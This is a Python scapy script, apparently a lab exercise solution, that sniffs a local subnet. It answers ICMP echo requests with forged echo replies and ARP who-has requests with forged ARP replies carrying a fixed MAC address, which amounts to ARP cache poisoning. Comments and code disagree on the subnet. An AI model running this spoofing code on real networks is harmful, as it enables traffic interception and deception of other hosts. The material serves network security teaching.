#!/usr/bin/python3
from scapy.all import *

def spoof(pkt):
    # If there is an ICMP packets and it is echo request(type 8)
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
        print("Capture a Packet ...")
        print("Source IP: ", pkt[IP].src)
        print("Destination IP: ", pkt[IP].dst)
        # Alter the packet
        # Spoof the source IP address as the destination one 
        print("Spoofing Packets")
        a  = IP(
                src=pkt[IP].dst,
                dst=pkt[IP].src,
                ihl=pkt[IP].ihl
                )
        # Spoof a ICMP echo reply packet, which is type 0 
        b = ICMP(
                type=0,
                id=pkt[ICMP].id,
                seq=pkt[ICMP].seq
                )
        # The original payload
        data = pkt[Raw].load
        reply_packet = a / b / data
        # Send the ICMP echo reply packet
        print("Source IP: ", reply_packet[IP].src)
        print("Destination IP: ", reply_packet[IP].dst)
        send(reply_packet, verbose=0)
    # ARP.op == 1 means op=who-has
    if pkt.haslayer(ARP) and pkt[ARP].op == 1:
        default_gateway = '10.0.2.1'
        spoofed_mac = '02:42:34:1c:66:e3'
        print("Our mac address: ", spoofed_mac)
        print("The destination address: ", pkt[ARP].pdst)
        arp = ARP(
                op=2,
                hwsrc=spoofed_mac,
                psrc=pkt[ARP].pdst,
                #psrc=default_gateway,
                hwdst=pkt[ARP].hwsrc,
                pdst=pkt[ARP].psrc
                )
        eth = Ether(
                dst=pkt[Ether].src,
                src=spoofed_mac
                )
        reply_packet = eth / arp
        print("Sending ARP reply packet ...")
        sendp(reply_packet, verbose=0)


interfaces = ['br-60049e293b27', 'enp0s3']
# Sniffing on two interfaces, filtering ICMP packets and the subnet 10.9.0.0/24 
pkt = sniff(
        filter='net 10.0.2.0/24',
        prn=spoof
        )
